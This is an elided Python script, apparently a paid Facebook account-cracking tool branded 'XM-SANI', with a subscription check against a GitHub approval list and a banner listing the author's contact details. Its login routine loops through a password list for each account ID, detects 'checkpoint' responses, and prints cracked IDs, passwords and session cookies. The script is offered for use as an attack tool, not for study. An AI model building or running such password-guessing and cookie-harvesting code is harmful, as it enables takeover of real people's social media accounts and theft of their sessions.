...
princp=[]
try:
	prox= requests.get('https://github.com/Sanikhan40/XDD04/blob/main/Approval04.text').text
...
uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {Tutul}
def uaku():
	try:
		...
		a=requests.get('https://github.com/Sanikhan40/XDD04/blob/main/Approval04.text').text
		ua=open('.bbnew.txt','w')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'Sani' and password == 'Khan':
...
os.system('espeak -a 300 " Welcome,   to,  XM-SANI,  Tools"')
os.system('xdg-open https://www.facebook.com/sanikhan570')
def banner():
	os.system("clear")
	print (f"""
\033[0;92
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-SANI ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Md Robel Mia ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38m XM-SANI  ]   ║\33[1;34m   
╠══[Whatsapp                 • 01930558938 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
...
def login():
	...
	if TUTUL in ['m']:
		...
		os.system('xdg-open https://wa.me/+8801930558938')
	elif TUTUL in ['0']:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#Tutul-King
				print(f'\r\033[0;92m[{time.strftime("%S:%M")}•SANI-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/Sanikhan40/XM-SANI/blob/main/approval.text").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		os.system('am start https://wa.me/+8801930558938?text=' + tks)
		Subscraption() 
Subscraption() 
login()
